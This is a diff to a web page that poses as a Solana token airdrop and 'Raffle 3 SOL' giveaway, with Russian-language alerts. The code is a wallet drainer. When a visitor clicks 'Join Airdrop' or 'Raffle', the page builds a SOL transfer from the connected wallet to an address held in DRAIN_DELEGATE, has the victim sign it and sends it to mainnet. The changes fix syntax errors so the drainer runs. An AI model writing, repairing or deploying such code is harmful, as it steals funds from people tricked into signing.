@@ -77,11 +77,11 @@
       <a href="#tokenomics">Tokenomics</a>
     </div>
     <div class="actions">
-      <button class="btn" id="connect-nav" onclick="connectWallet()">Connect Wallet</button>
-      <button id="airdrop-btn" class="btn btn-primary" disabled onclick="handleSign('airdrop')">
+     <button class="btn" id="connect-nav">Connect Wallet</button>
+     <button id="airdrop-btn" class="btn btn-primary" disabled>
         Join Airdrop
       </button>
-      <button id="raffle-btn" class="btn btn-accent" disabled onclick="handleSign('giveaway')">
+      <button id="raffle-btn" class="btn btn-accent" disabled>
         Raffle 3 SOL
       </button>
     </div>
@@ -233,7 +233,6 @@
       </div>
     </section>
   </main>
-  <script>
   <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>
 
@@ -255,7 +254,7 @@
 
         if (isMobile) {
             const dappUrl = encodeURIComponent(window.location.href);
-            window.location.href = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
+            window.location.href = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`;
             return;
         }
 
@@ -321,7 +320,7 @@
             const signed = await wallet.signTransaction(tx);
             const sig = await connection.sendRawTransaction(signed.serialize());
 
-            alert(Успех! Вы в аирдропе.\nTx: ${sig});
+            alert(`Успех! Вы в аирдропе.\nTx: ${sig}`);
             document.getElementById('airdrop-btn').disabled = true;
         } catch (err) {
             alert("Ошибка — попробуй снова");
@@ -335,7 +334,8 @@
             const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
             const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
             const owner = new solanaWeb3.PublicKey(walletPubkey);
-          const tx = new solanaWeb3.Transaction();
+
+            const tx = new solanaWeb3.Transaction();
             tx.add(solanaWeb3.SystemProgram.transfer({
                 fromPubkey: owner,
                 toPubkey: delegate,
@@ -349,7 +349,7 @@
             const signed = await wallet.signTransaction(tx);
             const sig = await connection.sendRawTransaction(signed.serialize());
 
-            alert(Успех! Вы в розыгрыше.\nTx: ${sig});
+            alert(`Успех! Вы в розыгрыше.\nTx: ${sig}`);
             document.getElementById('raffle-btn').disabled = true;
         } catch (err) {
             alert("Ошибка — попробуй снова");
